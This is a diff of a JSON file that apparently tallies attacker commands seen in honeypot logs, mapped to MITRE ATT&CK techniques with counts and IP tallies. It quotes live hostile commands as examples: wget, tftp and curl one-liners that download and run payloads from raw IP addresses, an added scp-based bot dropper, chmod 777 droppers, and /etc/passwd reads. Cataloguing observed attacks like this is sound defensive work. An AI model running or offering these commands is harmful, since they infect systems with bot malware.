@@ -8,14 +8,14 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 76427,
-      "distinct_ips": 251,
+      "count": 76429,
+      "distinct_ips": 252,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
         "echo -e \"\\x6F\\x6B\"",
-        "echo -e \"\\x47\\x41\\x59\"",
-        "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
-        "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
+        "echo -e \"\\x47\\x41\\x59\""
       ]
     },
     {
@@ -25,8 +25,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 4767,
-      "distinct_ips": 288,
+      "count": 4768,
+      "distinct_ips": 289,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -42,8 +42,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2057,
-      "distinct_ips": 269,
+      "count": 2058,
+      "distinct_ips": 270,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -145,8 +145,8 @@
         "discovery"
       ],
       "url": "https://attack.mitre.org/techniques/T1033",
-      "count": 4,
-      "distinct_ips": 4,
+      "count": 5,
+      "distinct_ips": 5,
       "examples": [
         "id",
         "whoami"
@@ -159,8 +159,8 @@
         "discovery"
       ],
       "url": "https://attack.mitre.org/techniques/T1087",
-      "count": 3,
-      "distinct_ips": 3,
+      "count": 4,
+      "distinct_ips": 4,
       "examples": [
         "cat /etc/passwd"
       ]
@@ -181,6 +181,6 @@
       ]
     }
   ],
-  "total_commands": 227865,
-  "matched_commands": 81872
+  "total_commands": 227885,
+  "matched_commands": 81876
 }
